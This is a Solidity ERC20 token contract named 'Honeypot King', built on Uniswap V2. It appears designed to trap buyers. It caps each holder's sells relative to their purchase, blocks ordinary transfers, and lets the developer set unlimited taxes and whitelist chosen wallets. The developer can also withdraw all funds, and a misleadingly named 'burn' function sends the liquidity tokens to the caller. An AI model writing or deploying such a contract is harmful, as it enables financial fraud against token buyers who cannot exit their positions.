// I've grown to hate each and every one of you

pragma solidity 0.8.18;

interface IUniswapV2Router02{
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}

contract ERC20_UniV2 {

    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    mapping(address => bool) public _whitelisted;
    mapping(address => uint) public _initial;
    mapping(address => bool) public _locked;
    mapping(address => uint) public _sold;
    mapping(address => uint256) public userFirstPurchase;
    uint256 public timeInterval = 24 hours;
    address private _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    string private _name = "Honeypot King";
    string private _symbol = "HK";
    uint private immutable _decimals = 18;
    uint private _totalSupply = 10000000 * 10 ** 18;
    uint public _swapAmount = 10 * 10 ** 18;
    uint public _buyTax = 2;
    uint public _sellTax = 2;
    uint public _max = 10;
    address public _v2Pair;
    address private _collector;
    address private _dev;
    address[] public _path;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyDev() {require(msg.sender == _dev, "Only the developer can call this function");_;}

    constructor(address collector_) {
        _collector = collector_; _dev = msg.sender;
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
        uniswapV2Router = IUniswapV2Router02(_v2Router);
        _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
        _whitelisted[address(this)] = true; _whitelisted[msg.sender] = true;
    }

    function name() external view returns (string memory) {return _name;}
    function symbol() external view returns (string memory) {return _symbol;}
    function decimals() external pure returns (uint) {return _decimals;}
    function totalSupply() external view returns (uint) {return _totalSupply;}
    function balanceOf(address account) external view returns (uint) {return _balances[account];}
    function allowance(address owner, address spender) external view returns (uint) {return _allowances[owner][spender];}

    function transfer(address to, uint256 amount) public returns (bool) {_transfer(msg.sender, to, amount); return true;}

    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount); return true;}

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

	function _transfer(address from, address to, uint256 amount) internal {
		require(_balances[from] >= amount && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair), "ERC20: transfer amount exceeds balance or max wallet");
        require(_whitelisted[from] || _whitelisted[to] || from == _v2Pair || to == _v2Pair, "No wallet-to-wallet shit");
        if (from == _v2Pair && !_whitelisted[to]) {
            uint256 ethValueOfTokens = getTokenValueInETH(amount);
            _initial[to] += ethValueOfTokens;
            userFirstPurchase[to] = block.timestamp;
        }

        if (to == _v2Pair && !_whitelisted[from]) {
            uint256 ethValueOfTokens = getTokenValueInETH(amount);
            require(_sold[from] + ethValueOfTokens <= _initial[from] * getCurrentMultiplier(from), "Can't have sells total more than your initial times the current multiplier");
            _sold[from] += ethValueOfTokens;
        }

		uint256 taxAmount = 0;
		if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to]) {
			if (to == _v2Pair) {taxAmount = amount * _sellTax / 100;} else {taxAmount = amount * _buyTax / 100;}
			_balances[address(this)] += taxAmount; emit Transfer(from, address(this), taxAmount);
			if (_balances[address(this)] > _swapAmount && to == _v2Pair) {_swapBack(_balances[address(this)]);}
		}
		_balances[from] -= amount; _balances[to] += (amount - taxAmount); emit Transfer(from, to, (amount - taxAmount));
	}

    function getTokenValueInETH(uint256 tokenAmount) public view returns (uint256) {
        uint[] memory amountsOut = uniswapV2Router.getAmountsOut(tokenAmount, _path);
        return amountsOut[1]; // The estimated amount of ETH for the provided tokenAmount
    }

    function getCurrentMultiplier(address user) public view returns (uint256) {
        if (userFirstPurchase[user] == 0) return 1; // If the user hasn't bought yet, return 1
        uint256 daysSinceFirstPurchase = (block.timestamp - userFirstPurchase[user]) / timeInterval;
        return daysSinceFirstPurchase + 1;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
        for (uint i = 0; i < addresses.length; i++) {
            _whitelisted[addresses[i]] = whitelisted_;
        }
    }

    function setDev (address dev_) external onlyDev {_dev = dev_;}

    function setTax (uint buyTax_, uint sellTax_) external onlyDev {_buyTax = buyTax_; _sellTax = sellTax_;}

    function setMax(uint max_) external onlyDev {_max = max_;}

    function setSwapAmount(uint swapAmount_) external onlyDev {_swapAmount = swapAmount_ * 10 ** _decimals;}

    function maxInt() internal view returns (uint) {return _totalSupply * _max / 100;}

    function _swapBack(uint256 amount_) internal{
        _approve(address(this), _v2Router, amount_ + 100);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
    }

    function _addLiquidity_AND_BURN() external onlyDev{
        _approve(address(this), _v2Router, _balances[address(this)]);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp);
    }

    function withdraw(uint amount_) external onlyDev {
        payable(_dev).transfer(address(this).balance);
        _transfer(address(this), _dev, amount_);
    }

    function deposit() external payable onlyDev{}
}